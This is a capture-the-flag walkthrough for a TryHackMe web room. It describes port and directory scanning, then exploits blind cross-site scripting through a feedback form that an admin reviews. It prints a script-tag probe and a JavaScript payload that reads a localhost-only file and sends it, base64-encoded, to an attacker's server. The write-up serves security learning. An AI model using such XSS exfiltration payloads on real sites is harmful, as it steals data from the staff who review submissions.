
🧠 Introduction

Another day, another CTF — and this one comes with some valuable lessons.

In this walkthrough, I document my full methodology for solving The Sticker Shop room on TryHackMe. You’ll see the correct exploitation path, but also the dead ends, mistakes, and misjudgments I made along the way. This isn't just a guide to the flag — it's a realistic breakdown of how problem-solving in CTFs actually unfolds.

I’ve redacted some specifics to avoid spoilers or encouraging shortcut flag hunting. The goal is learning — not farming points.
🎯 Room Scenario

    Your local sticker shop just launched their website. The same computer used for hosting is also used for browsing and checking customer feedback. Smart, right?

The objective is simple:

Can you retrieve the contents of http://10.10.91.51:8080/flag.txt?
🛰 Initial Recon

While waiting for the machine to boot, I set up my workspace with a structured folder layout. Good habits go a long way.

I began with a full port scan:

nmap -p- 10.10.91.51

Only port 8080 was open — pointing to a web application.
🌐 Web Application Inspection

Accessing http://10.10.91.51:8080 led to a basic website. It had a feedback form and a playful, amateur aesthetic — in line with the storyline.
🔍 Werkzeug & Python Detected

Viewing response headers showed the server was running Werkzeug and Python — likely Flask. The versions appeared outdated.
🔎 Exploring the Feedback Functionality

I tested the feedback form by submitting basic input to check for any reflection or direct interaction. No output or response was reflected to the screen.

So I captured the POST request using Burp Suite, forwarded it to Repeater, and started analyzing the backend behavior.

Still, nothing interesting was exposed — but the form mentioned that feedback would be reviewed by the team. That detail stood out.

    ✅ Key Observation: Manual review of submitted feedback could indicate a Blind XSS opportunity.

🧱 Directory Enumeration

I ran Gobuster to brute-force hidden paths:

gobuster dir -u http://10.10.91.51:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Unfortunately, no interesting directories were found. So I moved on.
🧠 Hypothesis: Blind XSS via Manual Review

The structure of the challenge, coupled with the manual feedback note, hinted toward a Blind Cross-Site Scripting (XSS) vector.

To test it, I used Burp Collaborator and submitted a basic Blind XSS payload through the feedback form:

"><script src=https://<your-collaborator-subdomain>.oastify.com></script>

I submitted a few variants, waited… and got a DNS pingback.

    💥 Success! Blind XSS was triggered — confirmation the admin is opening the feedback in a browser.

📤 Delivering the Exploit Payload

Now that XSS was confirmed, it was time to weaponize it.

The objective: steal the contents of flag.txt hosted at http://127.0.0.1:8080/flag.txt — a file that’s only accessible from localhost.

I hosted my own endpoint and wrote a malicious JavaScript payload to:

    Fetch the flag from 127.0.0.1

    Encode it in Base64

    Send it to my server via a GET request

Payload Structure

fetch('http://127.0.0.1:8080/flag.txt')
  .then(res => res.text())
  .then(data => {
    const encoded = btoa(data);
    fetch('http://<your-server>/exfil?' + encoded);
  });

After submitting it via the feedback form, I monitored my server…

✅ Boom — Base64-encoded flag received.

Decoded it locally and mission accomplished.
📋 Summary (Management Style)

Vulnerability Type: Blind Cross-Site Scripting (XSS)
Attack Vector: Feedback form reviewed manually in browser
Impact: Exfiltration of sensitive local file (flag.txt) via XSS
Tools Used:

    nmap for enumeration

    Burp Suite for interception & testing

    Gobuster for directory brute-forcing

    Custom XSS payload with fetch & exfiltration
